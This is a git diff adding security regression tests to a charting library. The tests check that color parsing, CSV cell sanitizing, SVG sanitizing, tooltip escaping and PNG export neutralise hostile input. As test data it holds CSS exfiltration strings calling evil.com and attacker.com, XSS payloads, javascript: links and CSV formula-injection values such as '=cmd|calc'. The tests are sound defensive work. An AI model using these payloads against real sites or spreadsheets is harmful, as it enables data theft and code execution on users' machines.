@@ -1,7 +1,16 @@
 // @vitest-environment happy-dom
-import { describe, it, expect } from 'vitest';
+import { describe, it, expect, vi } from 'vitest';
 import { renderChart } from './core/renderChart';
-import { exportToCSV, exportToSVG } from './core/export';
+import {
+  exportToCSV,
+  exportToSVG,
+  exportToPNG,
+  sanitizeCSVCell,
+  sanitizeSVGElement,
+  sanitizeSVGString,
+} from './core/export';
+import { parseSafeColor, parseSafeStrokeDasharray } from './core/color';
+import { renderTooltipHtml } from './core/tooltip';
 import { LineChart, BarChart } from './react';
 import { renderToString } from 'react-dom/server';
 import React from 'react';
@@ -343,6 +352,243 @@ describe('CHARTS Security & Remediation Regression Suite (M2)', () => {
       );
       expect(exportedSvg).toContain('href="#local-marker"');
       expect(exportedSvg).toContain('fill="url(#blue-gradient)"');
+    });
+
+    it('CHARTS-M3-03: parseSafeColor allows valid colors and rejects CSS injection vectors', () => {
+      // 1. Valid color representations
+      expect(parseSafeColor('#fff')).toBe('#fff');
+      expect(parseSafeColor('#3b82f6')).toBe('#3b82f6');
+      expect(parseSafeColor('#3b82f680')).toBe('#3b82f680');
+      expect(parseSafeColor('rgb(255, 0, 0)')).toBe('rgb(255, 0, 0)');
+      expect(parseSafeColor('rgba(59, 130, 246, 0.5)')).toBe(
+        'rgba(59, 130, 246, 0.5)'
+      );
+      expect(parseSafeColor('hsl(217, 91%, 60%)')).toBe('hsl(217, 91%, 60%)');
+      expect(parseSafeColor('oklch(0.7 0.15 150)')).toBe('oklch(0.7 0.15 150)');
+      expect(parseSafeColor('var(--color-primary)')).toBe(
+        'var(--color-primary)'
+      );
+      expect(parseSafeColor('var(--chart-1, #3b82f6)')).toBe(
+        'var(--chart-1, #3b82f6)'
+      );
+      expect(parseSafeColor('transparent')).toBe('transparent');
+      expect(parseSafeColor('currentColor')).toBe('currentColor');
+
+      // 2. CSS injection and exfiltration payloads must fall back to var(--color-primary)
+      expect(
+        parseSafeColor('red; background: url("http://evil.com/leak")')
+      ).toBe('var(--color-primary)');
+      expect(parseSafeColor('red; } body { background: black }')).toBe(
+        'var(--color-primary)'
+      );
+      expect(parseSafeColor('url(http://attacker.com/leak)')).toBe(
+        'var(--color-primary)'
+      );
+      expect(parseSafeColor('expression(alert(1))')).toBe(
+        'var(--color-primary)'
+      );
+      expect(parseSafeColor('@import "leak.css"')).toBe('var(--color-primary)');
+      expect(parseSafeColor('javascript:alert(1)')).toBe(
+        'var(--color-primary)'
+      );
+      expect(parseSafeColor('<script>alert(1)</script>')).toBe(
+        'var(--color-primary)'
+      );
+      expect(parseSafeColor(null)).toBe('var(--color-primary)');
+      expect(parseSafeColor('')).toBe('var(--color-primary)');
+
+      // 3. parseSafeStrokeDasharray validation
+      expect(parseSafeStrokeDasharray('5,5')).toBe('5,5');
+      expect(parseSafeStrokeDasharray('4 4')).toBe('4 4');
+      expect(parseSafeStrokeDasharray('10, 5, 2, 5')).toBe('10, 5, 2, 5');
+      expect(parseSafeStrokeDasharray('none')).toBe('none');
+      expect(parseSafeStrokeDasharray('5; background: url(x)')).toBe('4,4');
+      expect(parseSafeStrokeDasharray('invalid-string')).toBe('4,4');
+    });
+
+    it('CHARTS-M3-04: sanitizeCSVCell neutralizes Unicode fullwidth formula triggers and NBSP', () => {
+      // 1. Unicode fullwidth formula triggers
+      expect(sanitizeCSVCell('\uFF1D1+1')).toBe('"\'＝1+1"'); // Fullwidth equals
+      expect(sanitizeCSVCell('\uFF0B2+2')).toBe('"\'＋2+2"'); // Fullwidth plus
+      expect(sanitizeCSVCell('\uFF0D3+3')).toBe('"\'－3+3"'); // Fullwidth minus
+      expect(sanitizeCSVCell('\uFF20SUM(A1)')).toBe('"\'＠SUM(A1)"'); // Fullwidth at
+
+      // 2. Non-breaking space followed by trigger
+      expect(sanitizeCSVCell('\u00A0=cmd|calc')).toBe('"\'\u00A0=cmd|calc"');
+
+      // 3. Preserves genuine numbers
+      expect(sanitizeCSVCell(-50)).toBe('-50');
+      expect(sanitizeCSVCell(12.5)).toBe('12.5');
+      expect(sanitizeCSVCell(0)).toBe('0');
+      expect(sanitizeCSVCell('-50')).toBe('"-50"');
+      expect(sanitizeCSVCell('+12.5')).toBe('"+12.5"');
+
+      // 4. Strings that start with minus but are not pure numbers must be neutralized
+      expect(sanitizeCSVCell('-cmd|calc')).toBe('"\'-cmd|calc"');
+    });
+
+    it('CHARTS-M3-05: sanitizeSVGElement strips dangerous href protocols and foreign resources on <use> and <a>', () => {
+      const svg = document.createElementNS('http://www.w3.org/2000/svg', 'svg');
+
+      // External <use> element reference forbidden
+      const badUse = document.createElementNS(
+        'http://www.w3.org/2000/svg',
+        'use'
+      );
+      badUse.setAttribute('href', 'https://evil.com/icon.svg#test');
+      svg.appendChild(badUse);
+
+      // Local <use> reference allowed
+      const goodUse = document.createElementNS(
+        'http://www.w3.org/2000/svg',
+        'use'
+      );
+      goodUse.setAttribute('href', '#test-marker');
+      svg.appendChild(goodUse);
+
+      // External <a> link forbidden
+      const badLink = document.createElementNS(
+        'http://www.w3.org/2000/svg',
+        'a'
+      );
+      badLink.setAttribute('href', 'https://evil.com');
+      svg.appendChild(badLink);
+
+      // Javascript <a> link forbidden
+      const jsLink = document.createElementNS(
+        'http://www.w3.org/2000/svg',
+        'a'
+      );
+      jsLink.setAttribute('href', 'javascript:alert(1)');
+      svg.appendChild(jsLink);
+
+      sanitizeSVGElement(svg);
+
+      expect(badUse.getAttribute('href')).toBeNull();
+      expect(goodUse.getAttribute('href')).toBe('#test-marker');
+      expect(badLink.getAttribute('href')).toBeNull();
+      expect(jsLink.getAttribute('href')).toBeNull();
+    });
+
+    it('CHARTS-M3-06: sanitizeSVGString provides isomorphic defense-in-depth sanitization for SSR / headless exports', () => {
+      const maliciousSvgString = `
+        <svg xmlns="http://www.w3.org/2000/svg" width="400" height="200">
+          <script>stealData()</script>
+          <foreignObject><body xmlns="http://www.w3.org/1999/xhtml"><script>alert(1)</script></body></foreignObject>
+          <rect width="100" height="50" fill="#3b82f6" onload="alert('rect-xss')" />
+          <use href="https://evil.com/icons.svg#danger" />
+          <use href="#safe-symbol" />
+          <a href="javascript:alert(2)"><text>Click</text></a>
+          <style>@import url("https://evil.com/leak.css");</style>
+        </svg>
+      `;
+
+      const sanitized = sanitizeSVGString(maliciousSvgString);
+
+      // Malicious elements and attributes stripped
+      expect(sanitized).not.toContain('<script');
+      expect(sanitized).not.toContain('stealData');
+      expect(sanitized).not.toContain('<foreignObject');
+      expect(sanitized).not.toContain('onload=');
+      expect(sanitized).not.toContain('https://evil.com/icons.svg');
+      expect(sanitized).not.toContain('javascript:alert');
+      expect(sanitized).not.toContain('@import');
+
+      // Safe elements preserved
+      expect(sanitized).toContain('<rect');
+      expect(sanitized).toContain('fill="#3b82f6"');
+      expect(sanitized).toContain('href="#safe-symbol"');
+    });
+
+    it('CHARTS-M3-07: Tooltip rendering escapes series names, values, and colors in HTML tooltip markup', () => {
+      const payload = {
+        title: '<script>alert("title-xss")</script>',
+        items: [
+          {
+            label: '<img src=x onerror=alert("label-xss")>',
+            value: '<b onmouseover=alert("value-xss")>500</b>',
+            color: 'red; background: url(https://evil.com/leak)',
+          },
+        ],
+      };
+
+      const html = renderTooltipHtml(payload);
+
+      // Raw active tags must not exist
+      expect(html).not.toContain('<script>alert("title-xss")</script>');
+      expect(html).not.toContain('<img src=x onerror=alert("label-xss")>');
+      expect(html).not.toContain('<b onmouseover=alert("value-xss")>');
+      expect(html).not.toContain('url(https://evil.com/leak)');
+
+      // Must be safely escaped
+      expect(html).toContain(
+        '&lt;script&gt;alert(&quot;title-xss&quot;)&lt;/script&gt;'
+      );
+      expect(html).toContain(
+        '&lt;img src=x onerror=alert(&quot;label-xss&quot;)&gt;'
+      );
+      expect(html).toContain(
+        '&lt;b onmouseover=alert(&quot;value-xss&quot;)&gt;500&lt;/b&gt;'
+      );
+      expect(html).toContain('var(--color-primary)');
+    });
+
+    it('CHARTS-M3-08: exportToPNG bounds scale multiplier and canvas dimensions to prevent DoS', async () => {
+      const svg = document.createElementNS('http://www.w3.org/2000/svg', 'svg');
+      svg.setAttribute('width', '500');
+      svg.setAttribute('height', '300');
+
+      // Create a spy to check dimensions passed to canvas
+      let canvasW = 0;
+      let canvasH = 0;
+      const originalCreateElement = document.createElement.bind(document);
+
+      vi.spyOn(document, 'createElement').mockImplementation(
+        (tagName: string) => {
+          if (tagName === 'canvas') {
+            const fakeCanvas = {
+              width: 0,
+              height: 0,
+              getContext: () => ({
+                drawImage: () => undefined,
+              }),
+              toBlob: (cb: (blob: Blob | null) => void) => {
+                canvasW = fakeCanvas.width;
+                canvasH = fakeCanvas.height;
+                cb(new Blob(['fake-png'], { type: 'image/png' }));
+              },
+            } as unknown as HTMLCanvasElement;
+            return fakeCanvas;
+          }
+          return originalCreateElement(tagName);
+        }
+      );
+
+      // Simulate Image onload
+      const originalImage = globalThis.Image;
+      globalThis.Image = class MockImage extends originalImage {
+        set src(_val: string) {
+          setTimeout(() => {
+            if (this.onload) {
+              (this.onload as any)(new Event('load'));
+            }
+          }, 0);
+        }
+      } as any;
+
+      try {
+        // Request massive scale 100x (DoS attempt)
+        await exportToPNG(svg, '', 100);
+
+        // Bounded by MAX_SCALE = 4 -> 600 * 4 = 2400 (or bounded to 8192)
+        expect(canvasW).toBeLessThanOrEqual(8192);
+        expect(canvasH).toBeLessThanOrEqual(8192);
+        expect(canvasW).toBe(2400); // 600 default width * 4 maxScale
+        expect(canvasH).toBe(1200); // 300 default height * 4 maxScale
+      } finally {
+        vi.restoreAllMocks();
+        globalThis.Image = originalImage;
+      }
     });
   });
 });
